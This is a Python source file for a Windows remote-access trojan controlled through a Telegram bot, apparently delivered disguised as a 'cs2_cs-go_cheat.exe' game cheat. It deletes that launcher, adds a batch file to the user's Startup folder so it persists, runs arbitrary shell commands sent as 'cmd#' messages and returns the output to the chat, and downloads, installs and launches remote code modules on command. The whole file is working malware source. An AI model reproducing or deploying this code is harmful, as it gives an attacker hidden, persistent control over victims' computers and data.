"""
def getDownloadPath():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('python-3.12.1-amd64.exe')
    path='\\'.join(path)
    return path
"""
def downloadAndSetupMod(urlGit,name):
    global nameMods
    if not os.path.isdir(f"C:\\winTest\\{name}"):
        installed=[]
        noInstalled=[]
        os.mkdir(f"C:\\winTest\\{name}")
        try:
            response = requests.get(urlGit)
        except:
            return "noReposytory"
        zip_data = response.content
        with open(f"C:\\winTest\\{name}\\archive.zip", 'wb') as file:
            file.write(zip_data)
        with ZipFile(f"C:\\winTest\\{name}\\archive.zip", 'r') as zip_ref:
            zip_ref.extractall(f"C:\\winTest\\{name}")
        os.remove(f"C:\\winTest\\{name}\\archive.zip")
        dirSetupName=os.listdir(f"C:\\winTest\\{name}")[0]
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\{name}{'.py'}",f"C:\\winTest\\{name}\\{name}{'.pyw'}")
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\data",f"C:\\winTest\\{name}")
        shutil.rmtree(f"C:\\winTest\\{name}\\{dirSetupName}")
#        settingsFile=os.listdir(f"C;\\winTest\\{name}\\{dirSetupName}")[os.listdir(f"C;\\winTest\\{name}\\{dirSetupName}").index("modules.txt")]
#        shutil.rmtree(f"C:\\winTest\\{name}")
        print(dirSetupName)
        modules=[]
        with open(f"C:\\winTest\\{name}\\data\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        for i in modules:
            if int(os.system(f"pip3 install {i}"))==0:
                installed.append(i)
            else:
                noInstalled.append(i)
        with open("C:\\winTest\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        modules=list(set(modules))
        with open("C:\\winTest\\modules.txt","w") as file:
            for i in modules:
                file.write(i+'\n')
        with open("C:\\winTest\\mods.txt") as file:
            mods1=file.read().rstrip().split(' ')
        mods1.append(f"{urlGit}#{name}")
        with open("C:\\winTest\\mods.txt","w") as file:
            file.write(' '.join(mods1))
        nameMods.append(name)
        print(nameMods)
        return installed,noInstalled
    else:
        return "module installed"
def deletaEXE():
    with open("C:\\winTest\\dir.txt") as file:
        x=file.read().rstrip('\n').split('\\')[:-1]
    x1=x.copy()
    x.append('cs2_cs-go_cheat.exe')
    x1.append('python-3.12.1-amd64.exe')
    y='\\'.join(x)
    y1 = '\\'.join(x1)
    os.system(f"del {y}")
    os.system(f"del {y1}")
def startModule(dirName,fileName):
    global processes
    xx=subprocess.Popen(['python',f"C:\\winTest\\{dirName}\\{fileName}.pyw"])
    processes[dirName]=xx
def stopModule(name):
    global processes
    processes[name].terminate()
    del processes[name]
def run_command(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    b = bytes(result.stdout+result.stderr, "cp1251")
    s = str(b, "cp866")
    return s



import subprocess,time,os,shutil
os.system("pip3 install requests")
os.system("pip3 install pyTelegramBotAPI")
import requests,telebot
from zipfile import ZipFile
deletaEXE()
with open("C:\\winTest\\dir.txt") as file:
    x = file.read().rstrip('\n').split('\\')[:-2]
x.append("AppData")
x.append("Roaming")
x.append("Microsoft")
x.append("Windows")
x.append("Start Menu")
x.append("Programs")
x.append("Startup")
x.append("autoStartWin.bat")
x='\\'.join(x)
if not os.path.isfile(x):
    with open(x,"w+") as bat_file:
        bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")

if not os.path.isdir(f"C:\\winTest"):
    os.mkdir(f"C:\\winTest")
if not os.path.isfile("C:\\winTest\\modules.txt"):
    with open("C:\\winTest\\modules.txt","a"):
        pass
if not os.path.isfile("C:\\winTest\\mods.txt"):
    with open("C:\\winTest\\mods.txt","a"):
        pass
mods=[]
nameMods=[]
modules=[]
processes={}
with open("C:\\winTest\\mods.txt") as file:
    mods=file.read().rstrip('\n').lstrip().split(' ')
    print(mods)
with open("C:\\winTest\\modules.txt") as file:
    modules=file.read().rstrip('\n').split(' ')
for i in mods:
    try:
        url,n1=i.split('#')
        print(downloadAndSetupMod(url, n1))
        nameMods.append(n1)
    except ValueError:
        nameMods=[]
        print("exept")
print(nameMods)
for i in modules:
    os.system(f"pip3 install {i}")
with open("C:\\winTest\\dir1.txt") as file:
    token=file.read()
bot=telebot.TeleBot(token)
print(nameMods)
@bot.message_handler()
def message(message):
    x=message.text.lower().split('#')
    if x[0]=='test':
        bot.send_message(message.chat.id,"Связь в норме")
        print("test")
    elif x[0]=='module':
        print(nameMods)
        if x[1] in nameMods:
            if x[2]=="start":
                bot.send_message(message.chat.id,f"Модуль {x[1]} был успешно запущен")
                startModule(x[1],x[1])
                print("start")
            elif x[2]=="stop":
                try:
                    stopModule(x[1])
                    bot.send_message(message.chat.id, f"Модуль {x[1]} был успешно отключен")
                except:
                    bot.send_message(message.chat.id, f"Модуль {x[1]} не может быть успешно отключен потому, что произошла ошибка или он уже отключен")
                print("stop")
            else:
                bot.send_message(message.chat.id, f"Неправильный параметр {x[2]}")
                print("err")
                print("err2")
        else:
            bot.send_message(message.chat.id,f"Мод {x[1]} не установлен")
    elif x[0]=='setup':
        try:
            res1=downloadAndSetupMod(str(x[1]),str(x[2]))
            if res1=="noReposytory":
                bot.send_message(message.chat.id,f"Url {x[1]} не действителен")
            elif res1=="module installed":
                bot.send_message(message.chat.id,f"Мода {x[1]} уже инсталирован")
            else:
                bot.send_message(message.chat.id,f"{' '.join(res1[res1[0]])} были установлены")
                bot.send_message(message.chat.id, f"{' '.join(res1[res1[1]])} были неустановлены")
        except Exception as e:
            bot.send_message(message.chat.id,"При установке мода произошла ошибка")
            bot.send_message(message.chat.id, e)
            bot.send_message(message.chat.id, x[1]+' '+x[2])
        bot.send_message(message.chat.id,f"Список установленных модов {nameMods}")
    elif x[0]=="cmd":
        bot.send_message(message.chat.id,run_command(x[1]))
    else:
        bot.send_message(message.chat.id, "Ошибка в комманде")
        print("dsfdsfdg")
    print(f"Сообщение получено {x}")
#print(downloadAndSetupMod("https://api.github.com/repos/nick1t0s/localservonflask/zipball","localserver"))
bot.polling(none_stop=True)
# Запуск второго файла в отдельном процессе
#process = subprocess.Popen(['python', 'C:\\winTest\\localServ\\localServ.pyw'])

# ждем некоторое время, прежде чем прервать выполнение
#time.sleep(30)

# Прерывание выполнения второго файла
#process.terminate()


#print(downloadAndSetupMod('https://api.github.com/repos/Nick1t0s/localServOnFlask/zipball','localServ','localServ'))